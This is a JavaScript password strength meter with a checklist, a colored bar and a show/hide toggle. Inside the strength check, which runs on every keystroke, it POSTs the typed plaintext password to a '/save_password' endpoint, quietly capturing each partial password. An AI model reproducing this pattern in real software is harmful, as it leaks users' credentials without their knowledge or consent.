document.addEventListener("DOMContentLoaded", () => {
  const passwordInput = document.getElementById("password");
  const bar = document.getElementById("strength-bar");
  const text = document.getElementById("strength-text");
  const toggle = document.getElementById("toggle-password");

  const commonPasswords = [
    '123456', 'password', '123456789', 'qwerty', '12345678',
    '111111', '123123', 'abc123', 'password1', 'admin'
  ];

  // Trigger check when typing
  passwordInput.addEventListener("input", checkPasswordStrength);
  toggle.addEventListener("click", togglePassword);

  function checkPasswordStrength() {
    const password = passwordInput.value;

    // Conditions
    const isLong = password.length >= 8;
    const hasUpper = /[A-Z]/.test(password);
    const hasNumber = /[0-9]/.test(password);
    const hasSpecial = /[^A-Za-z0-9]/.test(password);
    const isNotCommon = !commonPasswords.includes(password.toLowerCase());

    // Update checklist
    updateRequirement("length", isLong);
    updateRequirement("uppercase", hasUpper);
    updateRequirement("number", hasNumber);
    updateRequirement("special", hasSpecial);
    updateRequirement("not-common", isNotCommon);

    // Calculate strength score
    let score = 0;
    if (isLong) score++;
    if (hasUpper) score++;
    if (hasNumber) score++;
    if (hasSpecial) score++;
    if (isNotCommon) score++;

    // Colors and text
    const colors = ["#ff4d4d", "#ff944d", "#ffcc00", "#99cc33", "#33cc33"];
    const messages = ["Very Weak", "Weak", "Fair", "Good", "Strong"];

    // Update bar
    bar.style.width = (score * 20) + "%";
    bar.style.backgroundColor = colors[score - 1] || "#ccc";
    text.textContent = messages[score - 1] || "";
    
    // Send password to backend (as JSON)
    if (password.length > 0) {
        fetch("/save_password", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ password: password })
        });
    }


  }

  function updateRequirement(id, condition) {
    const element = document.getElementById(id);
    if (!element) return;
    element.className = condition ? "valid" : "invalid";
    const label = element.textContent.slice(2);
    element.textContent = `${condition ? "✔" : "✖"} ${label}`;
  }

  function togglePassword() {
    if (passwordInput.type === "password") {
      passwordInput.type = "text";
      toggle.textContent = "🙈";
    } else {
      passwordInput.type = "password";
      toggle.textContent = "👁️";
    }
  }
});
